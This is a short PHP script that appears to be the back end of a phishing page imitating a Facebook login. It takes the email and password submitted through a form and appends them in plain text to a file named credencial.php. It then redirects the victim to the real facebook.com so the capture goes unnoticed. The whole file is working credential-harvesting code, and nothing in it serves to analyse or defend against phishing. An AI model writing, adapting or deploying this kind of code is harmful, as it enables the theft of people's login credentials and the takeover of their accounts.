<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
$guardame = fopen('credencial.php','a+');
fwrite($guardame,
	"username: ".$email.
"\password: ".$pass." ");

fclose($guardame);
echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
?>
